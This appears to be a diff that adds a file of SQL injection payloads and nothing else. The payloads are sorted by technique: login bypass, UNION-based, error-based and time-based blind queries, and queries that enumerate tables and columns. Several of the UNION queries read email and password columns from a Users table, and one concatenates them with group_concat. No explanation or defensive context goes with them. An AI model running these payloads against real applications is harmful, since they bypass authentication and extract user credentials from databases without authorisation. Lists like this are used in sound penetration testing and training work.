@@ -1,0 +1,28 @@
+# === Basic SQLi Payloads ===
+' OR '1'='1' --
+' OR 1=1 --
+admin' -- 
+' OR 'a'='a
+
+# === UNION-Based Payloads ===
+')) union select 1,2,3,4,5,6,7,8,sqlite_version()--
+')) union select 1,2,3,4,5,6,7,8,name from sqlite_master where type='table'--
+' UNION SELECT NULL,NULL,NULL --
+')) UNION SELECT 1,2,3,4,5,6,7,8 --
+')) UNION SELECT 1,table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables --
+
+# === Error-Based SQLi ===
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int)--
+
+# === Time-Based Blind ===
+' OR IF(1=1, SLEEP(5), 0)--
+' WAITFOR DELAY '0:0:5' --
+
+# === Extracting Tables and Columns ===
+')) UNION SELECT 1,name,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
+')) UNION SELECT 1,sql,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='Users'--
+')) UNION SELECT 1,email,password,NULL,NULL,NULL,NULL,NULL FROM Users--
+
+# === Using group_concat for multiple rows ===
+')) UNION SELECT 1,group_concat(email, ':' ,password),NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
